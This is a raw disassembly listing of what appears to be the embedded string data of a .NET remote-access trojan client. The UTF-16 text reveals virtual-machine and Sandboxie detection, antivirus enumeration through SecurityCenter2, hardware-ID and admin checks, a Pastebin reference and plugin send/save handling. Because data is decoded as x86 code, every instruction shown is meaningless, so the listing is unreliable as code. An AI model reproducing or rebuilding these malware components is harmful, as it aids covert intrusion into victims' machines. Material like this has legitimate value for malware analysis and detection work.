  40bb4d:	6d                   	insl   (%dx),%es:(%edi)
  40bb4e:	00 70 00             	add    %dh,0x0(%eax)
  40bb51:	75 00                	jne    0x40bb53
  40bb53:	74 00                	je     0x40bb55
  40bb55:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40bb59:	53                   	push   %ebx
  40bb5a:	00 79 00             	add    %bh,0x0(%ecx)
  40bb5d:	73 00                	jae    0x40bb5f
  40bb5f:	74 00                	je     0x40bb61
  40bb61:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40bb65:	00 19                	add    %bl,(%ecx)
  40bb67:	4d                   	dec    %ebp
  40bb68:	00 61 00             	add    %ah,0x0(%ecx)
  40bb6b:	6e                   	outsb  %ds:(%esi),(%dx)
  40bb6c:	00 75 00             	add    %dh,0x0(%ebp)
  40bb6f:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40bb73:	63 00                	arpl   %eax,(%eax)
  40bb75:	74 00                	je     0x40bb77
  40bb77:	75 00                	jne    0x40bb79
  40bb79:	72 00                	jb     0x40bb7b
  40bb7b:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40bb7f:	00 2b                	add    %ch,(%ebx)
  40bb81:	6d                   	insl   (%dx),%es:(%edi)
  40bb82:	00 69 00             	add    %ch,0x0(%ecx)
  40bb85:	63 00                	arpl   %eax,(%eax)
  40bb87:	72 00                	jb     0x40bb89
  40bb89:	6f                   	outsl  %ds:(%esi),(%dx)
  40bb8a:	00 73 00             	add    %dh,0x0(%ebx)
  40bb8d:	6f                   	outsl  %ds:(%esi),(%dx)
  40bb8e:	00 66 00             	add    %ah,0x0(%esi)
  40bb91:	74 00                	je     0x40bb93
  40bb93:	20 00                	and    %al,(%eax)
  40bb95:	63 00                	arpl   %eax,(%eax)
  40bb97:	6f                   	outsl  %ds:(%esi),(%dx)
  40bb98:	00 72 00             	add    %dh,0x0(%edx)
  40bb9b:	70 00                	jo     0x40bb9d
  40bb9d:	6f                   	outsl  %ds:(%esi),(%dx)
  40bb9e:	00 72 00             	add    %dh,0x0(%edx)
  40bba1:	61                   	popa
  40bba2:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40bba6:	00 6f 00             	add    %ch,0x0(%edi)
  40bba9:	6e                   	outsb  %ds:(%esi),(%dx)
  40bbaa:	00 00                	add    %al,(%eax)
  40bbac:	0b 4d 00             	or     0x0(%ebp),%ecx
  40bbaf:	6f                   	outsl  %ds:(%esi),(%dx)
  40bbb0:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40bbb4:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40bbb8:	0f 56 00             	orps   (%eax),%xmm0
  40bbbb:	49                   	dec    %ecx
  40bbbc:	00 52 00             	add    %dl,0x0(%edx)
  40bbbf:	54                   	push   %esp
  40bbc0:	00 55 00             	add    %dl,0x0(%ebp)
  40bbc3:	41                   	inc    %ecx
  40bbc4:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40bbc8:	0d 76 00 6d 00       	or     $0x6d0076,%eax
  40bbcd:	77 00                	ja     0x40bbcf
  40bbcf:	61                   	popa
  40bbd0:	00 72 00             	add    %dh,0x0(%edx)
  40bbd3:	65 00 00             	add    %al,%gs:(%eax)
  40bbd6:	15 56 00 69 00       	adc    $0x690056,%eax
  40bbdb:	72 00                	jb     0x40bbdd
  40bbdd:	74 00                	je     0x40bbdf
  40bbdf:	75 00                	jne    0x40bbe1
  40bbe1:	61                   	popa
  40bbe2:	00 6c 00 42          	add    %ch,0x42(%eax,%eax,1)
  40bbe6:	00 6f 00             	add    %ch,0x0(%edi)
  40bbe9:	78 00                	js     0x40bbeb
  40bbeb:	00 17                	add    %dl,(%edi)
  40bbed:	53                   	push   %ebx
  40bbee:	00 62 00             	add    %ah,0x0(%edx)
  40bbf1:	69 00 65 00 44 00    	imul   $0x440065,(%eax),%eax
  40bbf7:	6c                   	insb   (%dx),%es:(%edi)
  40bbf8:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40bbfc:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  40bc00:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40bc04:	11 45 00             	adc    %eax,0x0(%ebp)
  40bc07:	72 00                	jb     0x40bc09
  40bc09:	72 00                	jb     0x40bc0b
  40bc0b:	20 00                	and    %al,(%eax)
  40bc0d:	48                   	dec    %eax
  40bc0e:	00 57 00             	add    %dl,0x0(%edi)
  40bc11:	49                   	dec    %ecx
  40bc12:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40bc16:	05 78 00 32 00       	add    $0x320078,%eax
  40bc1b:	00 15 43 00 6c 00    	add    %dl,0x6c0043
  40bc21:	69 00 65 00 6e 00    	imul   $0x6e0065,(%eax),%eax
  40bc27:	74 00                	je     0x40bc29
  40bc29:	49                   	dec    %ecx
  40bc2a:	00 6e 00             	add    %ch,0x0(%esi)
  40bc2d:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40bc31:	00 09                	add    %cl,(%ecx)
  40bc33:	48                   	dec    %eax
  40bc34:	00 57 00             	add    %dl,0x0(%edi)
  40bc37:	49                   	dec    %ecx
  40bc38:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40bc3c:	09 55 00             	or     %edx,0x0(%ebp)
  40bc3f:	73 00                	jae    0x40bc41
  40bc41:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40bc45:	00 05 4f 00 53 00    	add    %al,0x53004f
  40bc4b:	00 13                	add    %dl,(%ebx)
  40bc4d:	4d                   	dec    %ebp
  40bc4e:	00 69 00             	add    %ch,0x0(%ecx)
  40bc51:	63 00                	arpl   %eax,(%eax)
  40bc53:	72 00                	jb     0x40bc55
  40bc55:	6f                   	outsl  %ds:(%esi),(%dx)
  40bc56:	00 73 00             	add    %dh,0x0(%ebx)
  40bc59:	6f                   	outsl  %ds:(%esi),(%dx)
  40bc5a:	00 66 00             	add    %ah,0x0(%esi)
  40bc5d:	74 00                	je     0x40bc5f
  40bc5f:	00 03                	add    %al,(%ebx)
  40bc61:	20 00                	and    %al,(%eax)
  40bc63:	00 09                	add    %cl,(%ecx)
  40bc65:	54                   	push   %esp
  40bc66:	00 72 00             	add    %dh,0x0(%edx)
  40bc69:	75 00                	jne    0x40bc6b
  40bc6b:	65 00 00             	add    %al,%gs:(%eax)
  40bc6e:	0b 36                	or     (%esi),%esi
  40bc70:	00 34 00             	add    %dh,(%eax,%eax,1)
  40bc73:	62 00                	bound  %eax,(%eax)
  40bc75:	69 00 74 00 00 0b    	imul   $0xb000074,(%eax),%eax
  40bc7b:	46                   	inc    %esi
  40bc7c:	00 61 00             	add    %ah,0x0(%ecx)
  40bc7f:	6c                   	insb   (%dx),%es:(%edi)
  40bc80:	00 73 00             	add    %dh,0x0(%ebx)
  40bc83:	65 00 00             	add    %al,%gs:(%eax)
  40bc86:	0b 33                	or     (%ebx),%esi
  40bc88:	00 32                	add    %dh,(%edx)
  40bc8a:	00 62 00             	add    %ah,0x0(%edx)
  40bc8d:	69 00 74 00 00 09    	imul   $0x9000074,(%eax),%eax
  40bc93:	50                   	push   %eax
  40bc94:	00 61 00             	add    %ah,0x0(%ecx)
  40bc97:	74 00                	je     0x40bc99
  40bc99:	68 00 00 0f 56       	push   $0x560f0000
  40bc9e:	00 65 00             	add    %ah,0x0(%ebp)
  40bca1:	72 00                	jb     0x40bca3
  40bca3:	73 00                	jae    0x40bca5
  40bca5:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40bcab:	00 0b                	add    %cl,(%ebx)
  40bcad:	41                   	inc    %ecx
  40bcae:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  40bcb2:	00 69 00             	add    %ch,0x0(%ecx)
  40bcb5:	6e                   	outsb  %ds:(%esi),(%dx)
  40bcb6:	00 00                	add    %al,(%eax)
  40bcb8:	09 74 00 72          	or     %esi,0x72(%eax,%eax,1)
  40bcbc:	00 75 00             	add    %dh,0x0(%ebp)
  40bcbf:	65 00 00             	add    %al,%gs:(%eax)
  40bcc2:	0b 66 00             	or     0x0(%esi),%esp
  40bcc5:	61                   	popa
  40bcc6:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
  40bcca:	00 65 00             	add    %ah,0x0(%ebp)
  40bccd:	00 17                	add    %dl,(%edi)
  40bccf:	50                   	push   %eax
  40bcd0:	00 65 00             	add    %ah,0x0(%ebp)
  40bcd3:	72 00                	jb     0x40bcd5
  40bcd5:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40bcd9:	72 00                	jb     0x40bcdb
  40bcdb:	6d                   	insl   (%dx),%es:(%edi)
  40bcdc:	00 61 00             	add    %ah,0x0(%ecx)
  40bcdf:	6e                   	outsb  %ds:(%esi),(%dx)
  40bce0:	00 63 00             	add    %ah,0x0(%ebx)
  40bce3:	65 00 00             	add    %al,%gs:(%eax)
  40bce6:	11 50 00             	adc    %edx,0x0(%eax)
  40bce9:	61                   	popa
  40bcea:	00 73 00             	add    %dh,0x0(%ebx)
  40bced:	74 00                	je     0x40bcef
  40bcef:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  40bcf3:	69 00 6e 00 00 13    	imul   $0x1300006e,(%eax),%eax
  40bcf9:	41                   	inc    %ecx
  40bcfa:	00 6e 00             	add    %ch,0x0(%esi)
  40bcfd:	74 00                	je     0x40bcff
  40bcff:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40bd05:	72 00                	jb     0x40bd07
  40bd07:	75 00                	jne    0x40bd09
  40bd09:	73 00                	jae    0x40bd0b
  40bd0b:	00 13                	add    %dl,(%ebx)
  40bd0d:	49                   	dec    %ecx
  40bd0e:	00 6e 00             	add    %ch,0x0(%esi)
  40bd11:	73 00                	jae    0x40bd13
  40bd13:	74 00                	je     0x40bd15
  40bd15:	61                   	popa
  40bd16:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40bd1a:	00 65 00             	add    %ah,0x0(%ebp)
  40bd1d:	64 00 00             	add    %al,%fs:(%eax)
  40bd20:	09 50 00             	or     %edx,0x0(%eax)
  40bd23:	6f                   	outsl  %ds:(%esi),(%dx)
  40bd24:	00 6e 00             	add    %ch,0x0(%esi)
  40bd27:	67 00 00             	add    %al,(%bx,%si)
  40bd2a:	0b 47 00             	or     0x0(%edi),%eax
  40bd2d:	72 00                	jb     0x40bd2f
  40bd2f:	6f                   	outsl  %ds:(%esi),(%dx)
  40bd30:	00 75 00             	add    %dh,0x0(%ebp)
  40bd33:	70 00                	jo     0x40bd35
  40bd35:	00 05 5c 00 5c 00    	add    %al,0x5c005c
  40bd3b:	00 2b                	add    %ch,(%ebx)
  40bd3d:	5c                   	pop    %esp
  40bd3e:	00 72 00             	add    %dh,0x0(%edx)
  40bd41:	6f                   	outsl  %ds:(%esi),(%dx)
  40bd42:	00 6f 00             	add    %ch,0x0(%edi)
  40bd45:	74 00                	je     0x40bd47
  40bd47:	5c                   	pop    %esp
  40bd48:	00 53 00             	add    %dl,0x0(%ebx)
  40bd4b:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40bd4f:	75 00                	jne    0x40bd51
  40bd51:	72 00                	jb     0x40bd53
  40bd53:	69 00 74 00 79 00    	imul   $0x790074,(%eax),%eax
  40bd59:	43                   	inc    %ebx
  40bd5a:	00 65 00             	add    %ah,0x0(%ebp)
  40bd5d:	6e                   	outsb  %ds:(%esi),(%dx)
  40bd5e:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40bd62:	00 72 00             	add    %dh,0x0(%edx)
  40bd65:	32 00                	xor    (%eax),%al
  40bd67:	00 3d 53 00 65 00    	add    %bh,0x650053
  40bd6d:	6c                   	insb   (%dx),%es:(%edi)
  40bd6e:	00 65 00             	add    %ah,0x0(%ebp)
  40bd71:	63 00                	arpl   %eax,(%eax)
  40bd73:	74 00                	je     0x40bd75
  40bd75:	20 00                	and    %al,(%eax)
  40bd77:	2a 00                	sub    (%eax),%al
  40bd79:	20 00                	and    %al,(%eax)
  40bd7b:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40bd7f:	6f                   	outsl  %ds:(%esi),(%dx)
  40bd80:	00 6d 00             	add    %ch,0x0(%ebp)
  40bd83:	20 00                	and    %al,(%eax)
  40bd85:	41                   	inc    %ecx
  40bd86:	00 6e 00             	add    %ch,0x0(%esi)
  40bd89:	74 00                	je     0x40bd8b
  40bd8b:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40bd91:	72 00                	jb     0x40bd93
  40bd93:	75 00                	jne    0x40bd95
  40bd95:	73 00                	jae    0x40bd97
  40bd97:	50                   	push   %eax
  40bd98:	00 72 00             	add    %dh,0x0(%edx)
  40bd9b:	6f                   	outsl  %ds:(%esi),(%dx)
  40bd9c:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  40bda0:	00 63 00             	add    %ah,0x0(%ebx)
  40bda3:	74 00                	je     0x40bda5
  40bda5:	00 17                	add    %dl,(%edi)
  40bda7:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40bdab:	73 00                	jae    0x40bdad
  40bdad:	70 00                	jo     0x40bdaf
  40bdaf:	6c                   	insb   (%dx),%es:(%edi)
  40bdb0:	00 61 00             	add    %ah,0x0(%ecx)
  40bdb3:	79 00                	jns    0x40bdb5
  40bdb5:	4e                   	dec    %esi
  40bdb6:	00 61 00             	add    %ah,0x0(%ecx)
  40bdb9:	6d                   	insl   (%dx),%es:(%edi)
  40bdba:	00 65 00             	add    %ah,0x0(%ebp)
  40bdbd:	00 07                	add    %al,(%edi)
  40bdbf:	4e                   	dec    %esi
  40bdc0:	00 2f                	add    %ch,(%edi)
  40bdc2:	00 41 00             	add    %al,0x0(%ecx)
  40bdc5:	00 05 2c 00 20 00    	add    %al,0x20002c
  40bdcb:	00 13                	add    %dl,(%ebx)
  40bdcd:	53                   	push   %ebx
  40bdce:	00 6f 00             	add    %ch,0x0(%edi)
  40bdd1:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  40bdd6:	00 61 00             	add    %ah,0x0(%ecx)
  40bdd9:	72 00                	jb     0x40bddb
  40bddb:	65 00 5c 00 00       	add    %bl,%gs:0x0(%eax,%eax,1)
  40bde0:	09 70 00             	or     %esi,0x0(%eax)
  40bde3:	6f                   	outsl  %ds:(%esi),(%dx)
  40bde4:	00 6e 00             	add    %ch,0x0(%esi)
  40bde7:	67 00 00             	add    %al,(%bx,%si)
  40bdea:	0d 70 00 6c 00       	or     $0x6c0070,%eax
  40bdef:	75 00                	jne    0x40bdf1
  40bdf1:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40bdf5:	6e                   	outsb  %ds:(%esi),(%dx)
  40bdf6:	00 00                	add    %al,(%eax)
  40bdf8:	15 73 00 61 00       	adc    $0x610073,%eax
  40bdfd:	76 00                	jbe    0x40bdff
  40bdff:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  40be03:	6c                   	insb   (%dx),%es:(%edi)
  40be04:	00 75 00             	add    %dh,0x0(%ebp)
  40be07:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40be0b:	6e                   	outsb  %ds:(%esi),(%dx)
  40be0c:	00 00                	add    %al,(%eax)
  40be0e:	07                   	pop    %es
  40be0f:	44                   	inc    %esp
  40be10:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40be14:	00 00                	add    %al,(%eax)
  40be16:	15 73 00 65 00       	adc    $0x650073,%eax
  40be1b:	6e                   	outsb  %ds:(%esi),(%dx)
  40be1c:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
  40be20:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40be24:	00 67 00             	add    %ah,0x0(%edi)
  40be27:	69 00 6e 00 00 0d    	imul   $0xd00006e,(%eax),%eax
  40be2d:	48                   	dec    %eax
  40be2e:	00 61 00             	add    %ah,0x0(%ecx)
  40be31:	73 00                	jae    0x40be33
  40be33:	68 00 65 00 73       	push   $0x73006500
  40be38:	00 00                	add    %al,(%eax)
  40be3a:	09 48 00             	or     %ecx,0x0(%eax)
  40be3d:	61                   	popa
  40be3e:	00 73 00             	add    %dh,0x0(%ebx)
  40be41:	68 00 00 1b 50       	push   $0x501b0000
  40be46:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40be4a:	00 67 00             	add    %ah,0x0(%edi)
  40be4d:	69 00 6e 00 2e 00    	imul   $0x2e006e,(%eax),%eax
  40be53:	50                   	push   %eax
  40be54:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40be58:	00 67 00             	add    %ah,0x0(%edi)
  40be5b:	69 00 6e 00 00 07    	imul   $0x700006e,(%eax),%eax
  40be61:	52                   	push   %edx
  40be62:	00 75 00             	add    %dh,0x0(%ebp)
  40be65:	6e                   	outsb  %ds:(%esi),(%dx)
  40be66:	00 00                	add    %al,(%eax)
  40be68:	0f 4d 00             	cmovge (%eax),%eax
  40be6b:	73 00                	jae    0x40be6d
  40be6d:	67 00 70 00          	add    %dh,0x0(%bx,%si)
  40be71:	61                   	popa
  40be72:	00 63 00             	add    %ah,0x0(%ebx)
  40be75:	6b 00 00             	imul   $0x0,(%eax),%eax
  40be78:	11 52 00             	adc    %edx,0x0(%edx)
  40be7b:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40be7f:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  40be83:	76 00                	jbe    0x40be85
  40be85:	65 00 64 00 00       	add    %ah,%gs:0x0(%eax,%eax,1)
  40be8a:	0b 45 00             	or     0x0(%ebp),%eax
  40be8d:	72 00                	jb     0x40be8f
  40be8f:	72 00                	jb     0x40be91
  40be91:	6f                   	outsl  %ds:(%esi),(%dx)
  40be92:	00 72 00             	add    %dh,0x0(%edx)
  40be95:	00 47 6d             	add    %al,0x6d(%edi)
  40be98:	00 61 00             	add    %ah,0x0(%ecx)
  40be9b:	73 00                	jae    0x40be9d
  40be9d:	74 00                	je     0x40be9f
  40be9f:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40bea3:	4b                   	dec    %ebx
  40bea4:	00 65 00             	add    %ah,0x0(%ebp)
  40bea7:	79 00                	jns    0x40bea9
  40bea9:	20 00                	and    %al,(%eax)
  40beab:	63 00                	arpl   %eax,(%eax)
  40bead:	61                   	popa
  40beae:	00 6e 00             	add    %ch,0x0(%esi)
  40beb1:	20 00                	and    %al,(%eax)
  40beb3:	6e                   	outsb  %ds:(%esi),(%dx)
  40beb4:	00 6f 00             	add    %ch,0x0(%edi)
  40beb7:	74 00                	je     0x40beb9
  40beb9:	20 00                	and    %al,(%eax)
  40bebb:	62 00                	bound  %eax,(%eax)
  40bebd:	65 00 20             	add    %ah,%gs:(%eax)
  40bec0:	00 6e 00             	add    %ch,0x0(%esi)
  40bec3:	75 00                	jne    0x40bec5
  40bec5:	6c                   	insb   (%dx),%es:(%edi)
  40bec6:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  40beca:	00 6f 00             	add    %ch,0x0(%edi)
  40becd:	72 00                	jb     0x40becf
  40becf:	20 00                	and    %al,(%eax)
  40bed1:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40bed5:	70 00                	jo     0x40bed7
  40bed7:	74 00                	je     0x40bed9
  40bed9:	79 00                	jns    0x40bedb
  40bedb:	2e 00 00             	add    %al,%cs:(%eax)
  40bede:	2d 69 00 6e 00       	sub    $0x6e0069,%eax
  40bee3:	70 00                	jo     0x40bee5
  40bee5:	75 00                	jne    0x40bee7
  40bee7:	74 00                	je     0x40bee9
  40bee9:	20 00                	and    %al,(%eax)
  40beeb:	63 00                	arpl   %eax,(%eax)
  40beed:	61                   	popa
  40beee:	00 6e 00             	add    %ch,0x0(%esi)
  40bef1:	20 00                	and    %al,(%eax)
  40bef3:	6e                   	outsb  %ds:(%esi),(%dx)
  40bef4:	00 6f 00             	add    %ch,0x0(%edi)
  40bef7:	74 00                	je     0x40bef9
  40bef9:	20 00                	and    %al,(%eax)
  40befb:	62 00                	bound  %eax,(%eax)
  40befd:	65 00 20             	add    %ah,%gs:(%eax)
  40bf00:	00 6e 00             	add    %ch,0x0(%esi)
  40bf03:	75 00                	jne    0x40bf05
  40bf05:	6c                   	insb   (%dx),%es:(%edi)
  40bf06:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40bf0a:	00 00                	add    %al,(%eax)
  40bf0c:	55                   	push   %ebp
  40bf0d:	49                   	dec    %ecx
  40bf0e:	00 6e 00             	add    %ch,0x0(%esi)
  40bf11:	76 00                	jbe    0x40bf13
  40bf13:	61                   	popa
  40bf14:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40bf18:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  40bf1c:	00 6d 00             	add    %ch,0x0(%ebp)
  40bf1f:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40bf23:	73 00                	jae    0x40bf25
  40bf25:	61                   	popa
  40bf26:	00 67 00             	add    %ah,0x0(%edi)
  40bf29:	65 00 20             	add    %ah,%gs:(%eax)
  40bf2c:	00 61 00             	add    %ah,0x0(%ecx)
  40bf2f:	75 00                	jne    0x40bf31
  40bf31:	74 00                	je     0x40bf33
  40bf33:	68 00 65 00 6e       	push   $0x6e006500
  40bf38:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40bf3c:	00 63 00             	add    %ah,0x0(%ebx)
  40bf3f:	61                   	popa
  40bf40:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40bf44:	00 6f 00             	add    %ch,0x0(%edi)
  40bf47:	6e                   	outsb  %ds:(%esi),(%dx)
  40bf48:	00 20                	add    %ah,(%eax)
  40bf4a:	00 63 00             	add    %ah,0x0(%ebx)
  40bf4d:	6f                   	outsl  %ds:(%esi),(%dx)
  40bf4e:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40bf52:	00 20                	add    %ah,(%eax)
  40bf54:	00 28                	add    %ch,(%eax)
  40bf56:	00 4d 00             	add    %cl,0x0(%ebp)
  40bf59:	41                   	inc    %ecx
  40bf5a:	00 43 00             	add    %al,0x0(%ebx)
  40bf5d:	29 00                	sub    %eax,(%eax)
  40bf5f:	2e 00 00             	add    %al,%cs:(%eax)
  40bf62:	05 58 00 32 00       	add    $0x320058,%eax
  40bf67:	00 0f                	add    %cl,(%edi)
  40bf69:	7b 00                	jnp    0x40bf6b
  40bf6b:	30 00                	xor    %al,(%eax)
  40bf6d:	3a 00                	cmp    (%eax),%al
  40bf6f:	44                   	inc    %esp
  40bf70:	00 33                	add    %dh,(%ebx)
  40bf72:	00 7d 00             	add    %bh,0x0(%ebp)
  40bf75:	20 00                	and    %al,(%eax)
  40bf77:	00 0f                	add    %cl,(%edi)
  40bf79:	7b 00                	jnp    0x40bf7b
  40bf7b:	30 00                	xor    %al,(%eax)
  40bf7d:	3a 00                	cmp    (%eax),%al
  40bf7f:	58                   	pop    %eax
  40bf80:	00 32                	add    %dh,(%edx)
  40bf82:	00 7d 00             	add    %bh,0x0(%ebp)
  40bf85:	20 00                	and    %al,(%eax)
  40bf87:	00 2b                	add    %ch,(%ebx)
  40bf89:	28 00                	sub    %al,(%eax)
  40bf8b:	6e                   	outsb  %ds:(%esi),(%dx)
  40bf8c:	00 65 00             	add    %ah,0x0(%ebp)
  40bf8f:	76 00                	jbe    0x40bf91
  40bf91:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40bf95:	20 00                	and    %al,(%eax)
  40bf97:	75 00                	jne    0x40bf99
  40bf99:	73 00                	jae    0x40bf9b
  40bf9b:	65 00 64 00 29       	add    %ah,%gs:0x29(%eax,%eax,1)
  40bfa0:	00 20                	add    %ah,(%eax)
  40bfa2:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  40bfa6:	00 70 00             	add    %dh,0x0(%eax)
  40bfa9:	65 00 20             	add    %ah,%gs:(%eax)
  40bfac:	00 24 00             	add    %ah,(%eax,%eax,1)
  40bfaf:	63 00                	arpl   %eax,(%eax)
  40bfb1:	31 00                	xor    %eax,(%eax)
  40bfb3:	00 45 28             	add    %al,0x28(%ebp)
  40bfb6:	00 65 00             	add    %ah,0x0(%ebp)
  40bfb9:	78 00                	js     0x40bfbb
  40bfbb:	74 00                	je     0x40bfbd
  40bfbd:	38 00                	cmp    %al,(%eax)
  40bfbf:	2c 00                	sub    $0x0,%al
  40bfc1:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40bfc5:	74 00                	je     0x40bfc7
  40bfc7:	31 00                	xor    %eax,(%eax)
  40bfc9:	36 00 2c 00          	add    %ch,%ss:(%eax,%eax,1)
  40bfcd:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40bfd1:	33 00                	xor    (%eax),%eax
  40bfd3:	32 00                	xor    (%eax),%al
  40bfd5:	29 00                	sub    %eax,(%eax)
  40bfd7:	20 00                	and    %al,(%eax)
  40bfd9:	74 00                	je     0x40bfdb
  40bfdb:	79 00                	jns    0x40bfdd
  40bfdd:	70 00                	jo     0x40bfdf
  40bfdf:	65 00 20             	add    %ah,%gs:(%eax)
  40bfe2:	00 24 00             	add    %ah,(%eax,%eax,1)
  40bfe5:	63 00                	arpl   %eax,(%eax)
  40bfe7:	37                   	aaa
  40bfe8:	00 2c 00             	add    %ch,(%eax,%eax,1)
  40bfeb:	24 00                	and    $0x0,%al
  40bfed:	63 00                	arpl   %eax,(%eax)
  40bfef:	38 00                	cmp    %al,(%eax)
  40bff1:	2c 00                	sub    $0x0,%al
  40bff3:	24 00                	and    $0x0,%al
  40bff5:	63 00                	arpl   %eax,(%eax)
  40bff7:	39 00                	cmp    %eax,(%eax)
  40bff9:	00 00                	add    %al,(%eax)
  40bffb:	00 14 74             	add    %dl,(%esp,%esi,2)
  40bffe:	6b 73 7b 88          	imul   $0xffffff88,0x7b(%ebx),%esi
  40c002:	11 4e 8d             	adc    %ecx,-0x73(%esi)
  40c005:	24 f5                	and    $0xf5,%al
  40c007:	ac                   	lods   %ds:(%esi),%al
  40c008:	9a d7 a1 0a 00 08 b7 	lcall  $0xb708,$0xaa1d7
  40c00f:	7a 5c                	jp     0x40c06d
  40c011:	56                   	push   %esi
  40c012:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  40c015:	89 03                	mov    %eax,(%ebx)
  40c017:	00 00                	add    %al,(%eax)
  40c019:	01 03                	add    %eax,(%ebx)
  40c01b:	20 00                	and    %al,(%eax)
  40c01d:	01 02                	add    %eax,(%edx)
  40c01f:	06                   	push   %es
  40c020:	0e                   	push   %cs
  40c021:	03 06                	add    (%esi),%eax
  40c023:	12 09                	adc    (%ecx),%cl
  40c025:	03 06                	add    (%esi),%eax
  40c027:	12 44 03 00          	adc    0x0(%ebx,%eax,1),%al
  40c02b:	00 02                	add    %al,(%edx)
  40c02d:	03 06                	add    (%esi),%eax
  40c02f:	12 0d 03 06 12 11    	adc    0x11120603,%cl
  40c035:	03 06                	add    (%esi),%eax
  40c037:	1d 05 02 06 0a       	sbb    $0xa060205,%eax
  40c03c:	03 06                	add    (%esi),%eax
  40c03e:	12 15 02 06 02 02    	adc    0x2020602,%dl
  40c044:	06                   	push   %es
  40c045:	1c 02                	sbb    $0x2,%al
  40c047:	06                   	push   %es
  40c048:	08 04 00             	or     %al,(%eax,%eax,1)
  40c04b:	00 12                	add    %dl,(%edx)
  40c04d:	0d 05 00 01 01       	or     $0x1010005,%eax
  40c052:	12 0d 04 00 00 12    	adc    0x12000004,%cl
  40c058:	11 05 00 01 01 12    	adc    %eax,0x12010100
  40c05e:	11 04 00             	adc    %eax,(%eax,%eax,1)
  40c061:	00 1d 05 05 00 01    	add    %bl,0x1000505
  40c067:	01 1d 05 03 00 00    	add    %ebx,0x305
  40c06d:	0a 04 00             	or     (%eax,%eax,1),%al
  40c070:	01 01                	add    %eax,(%ecx)
  40c072:	0a 04 00             	or     (%eax,%eax,1),%al
  40c075:	00 12                	add    %dl,(%edx)
  40c077:	15 05 00 01 01       	adc    $0x1010005,%eax
  40c07c:	12 15 04 00 01 01    	adc    0x1010004,%dl
  40c082:	02 03                	add    (%ebx),%al
  40c084:	00 00                	add    %al,(%eax)
  40c086:	1c 03                	sbb    $0x3,%al
  40c088:	00 00                	add    %al,(%eax)
  40c08a:	08 04 00             	or     %al,(%eax,%eax,1)
  40c08d:	01 01                	add    %eax,(%ecx)
  40c08f:	08 04 00             	or     %al,(%eax,%eax,1)
  40c092:	01 02                	add    %eax,(%edx)
  40c094:	0e                   	push   %cs
  40c095:	0a 00                	or     (%eax),%al
  40c097:	04 02                	add    $0x2,%al
  40c099:	1c 12                	sbb    $0x12,%al
  40c09b:	19 12                	sbb    %edx,(%edx)
  40c09d:	1d 11 21 05 00       	sbb    $0x52111,%eax
  40c0a2:	01 01                	add    %eax,(%ecx)
  40c0a4:	12 25 04 00 01 01    	adc    0x1010004,%ah
  40c0aa:	1c 04                	sbb    $0x4,%al
  40c0ac:	08 00                	or     %al,(%eax)
  40c0ae:	12 0d 04 08 00 12    	adc    0x12000804,%cl
  40c0b4:	11 04 08             	adc    %eax,(%eax,%ecx,1)
  40c0b7:	00 1d 05 03 08 00    	add    %bl,0x80305
  40c0bd:	0a 04 08             	or     (%eax,%ecx,1),%al
  40c0c0:	00 12                	add    %dl,(%edx)
  40c0c2:	15 03 08 00 02       	adc    $0x2000803,%eax
  40c0c7:	03 08                	add    (%eax),%ecx
  40c0c9:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  40c0cc:	08 00                	or     %al,(%eax)
  40c0ce:	08 03                	or     %al,(%ebx)
  40c0d0:	00 00                	add    %al,(%eax)
  40c0d2:	0e                   	push   %cs
